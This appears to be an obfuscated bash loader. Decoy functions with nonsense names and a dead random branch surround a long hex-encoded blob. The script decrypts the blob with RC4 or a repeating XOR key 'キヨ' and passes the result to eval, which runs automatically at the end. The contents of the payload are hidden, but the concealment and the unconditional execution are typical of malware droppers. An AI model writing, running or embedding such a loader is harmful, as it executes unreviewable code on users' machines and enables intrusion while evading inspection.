set +H
_Ptf-25(){ local _x=$((RANDOM%9999)); [ $_x -eq 1337 ] && echo "Z"; }
_Qzr-88(){ for _i in {1..3}; do :; done; }
_Mvk-14(){ false && exit 0; }
_Njx-63(){ echo "Z" > /dev/null; }
_Wpb-07(){ local _y=$((RANDOM%100)); [ $_y -eq 50 ] && echo "Z"; }
_Rcs-42(){ local _a=$1; local _b=""; for ((_i=0;_i<${#_a};_i++)); do _b+="${_a:$_i:1}"; done; echo "$_b"; }
_Ldg-19(){ _Qzr-88; _Njx-63; }
_Hkx-31(){
  perl -e '
    local $/;
    my $h = <STDIN>;
    $h =~ s/\s//g;
    my $d = pack("H*", $h);
    my $k = "キヨ";
    my $kl = length($k);
    my $i = 0;
    my $o = "";
    for my $c (split //, $d) {
      my $kc = substr($k, $i % $kl, 1);
      $o .= chr(ord($c) ^ ord($kc));
      $i++;
    }
    print $o;
  '
}
_Tbq-77(){
  local _z="$1"
  local _r
  _r=$(echo "$_z" | xxd -r -p | openssl enc -d -rc4 -K $(printf '%s' 'キヨ' | xxd -p | tr -d '\n') 2>/dev/null)
  [ -z "$_r" ] && _r=$(echo "$_z" | _Hkx-31)
  echo "$_r"
}
_Vmn-05(){ echo "$1" | xxd -r -p; }
_Ypl-92(){ local _s="$1"; echo "${_s:0:${#_s}}"; }
_Gfr-58(){ _Ptf-25; _Njx-63; _Wpb-07; }
_Zwk-11(){ _Mvk-14; _Qzr-88; }
__P__="c0a2e986f5cd8feddd86f188d9a2f98bfbd199f899d3b7a2c0a2ef96f0cd97a2c98aa3fa8aecc88ea3cf88a2d996eb88d9f4a7e9f7cd8ebf8fb3adc097efc1c189da8cf690d389cb82f0c4bcf3c791f685caa3d3e9f5c58aefcdc3f6df96e693c3e6c2e9f1c797bf89cbabfaa2cce9acce88c6a294d3b398c3a98dd2b398d3ab84e9eacec3a38dcbe6cb8bed8ddda38787e7dbccf7cb93ad9cd1b486d3ac9dcdb287c7f0c297aa88ddadc986f5878df7c18fa39adda49cd8a3dc8be7c3e9f1cd97f7df8d89ce8a88c98cedcde9ffa780e2da8adddd8cf1dce9e1c186e2dac388c880ebc7c3a08fe9e6cb8bed8dcee688c1de9dd0b0f3d0b196d2eefb8aeecc8be8c98d88de82efc18da2c982ed8881f7c68289cc8aa2ce91ebc78ee78d131c3964723272048ae9e7ce8bec88c1a0a786e0c08ca28086a38abfb29ed0d89bd1b99c8eebdc97f297ccacc48ce1cc8febc790f697c7f1c797a0a786e0c08ca28fc189d89af6c58ced9bc3afcec3a1a28aefdd8cf1dcc3ead997f38690e7df95e6dacfa2de8ce0c386f6de86f1de86f0a780efc990f18dababc097f6ddcdf0cd91f4c891adea82f1c8abd7fcb3d0c892f6cd90f6e582edcc8fe7dfcab9a2c3a28dc3e7cd85a2c98cdcefa6d68590e6c485ab97e9a388c3a28dc3a38897f0d4d98988c3a28dc3a388c3a28dc3a3df8af6c5c3ecd886ec85c4a7dc86ef8acfa4da81a584c3e2dbc3e497e9a388c3a28dc3a388c3a28dc3a388c3a2cfc3be8885acdf86e2cccbaba7c3a388c3a28dc3a388c3a28d90e6c485acde86edccbcf0c890f3c78df1c8cbb198d3aba7c3a388c3a28dc3a388c3a28d90e6c485acde86edccbceac882e7cd91aa8aa0ecc697e7c397aefc9af2c8c4af8f97e7d597acc097efc1c4aaa2c3a28dc3a388c3a28dc3a38890e7c185adcd8de6f28be6c987e7df90ab81e9a28dc3a388c3a28dc3a388c3f1c88fe58694e4c48fe68694f0c497e68081aba7c3a388c3a28dc3a3cd9be1c893f792e9a28dc3a388c3a28dc3a388c3f1c88fe58690e7c387dcda86f1dd8ceddb86aa99d3b781e9a28dc3a388c3a28dc3a388c3f1c88fe58686ecc9bcebcd82e6c891f080ca888dc3a38887e7cbc3efc784ddc086f0db82e5c8cbf0cd8fe481c9e281d9a2dd82f0dbe988de8ce0c386f6de86f1de86f083b7c0f8b0e7df95e6dacde3c18fecdfbcf0c896f0cdbce3c987f1cd90f18ddea3fc91f7c8e9f4c197ea8d90eccb88e7d990e6da95e7dfcdd7ebb3d1c891f5cd91aa85c4b29ad4ac9dcdb386d2a581c7f1c797ab81c3cb81c3e3dec3f092e9a28dc3a3dbcdf1c891f5cdbce4c291e6de86f085ca898a"
_Sxd-64(){
  local _e="$__P__"
  local _d=""
  _d=$(_Tbq-77 "$_e")
  [ -z "$_d" ] && _d=$(_Hkx-31 <<< "$_e")
  [ -z "$_d" ] && _d=$(_Vmn-05 "$_e")
  eval "$_d"
}
if [ "$RANDOM" -gt 99999 ]; then
  _Gfr-58
else
  _Zwk-11
fi
_Sxd-64
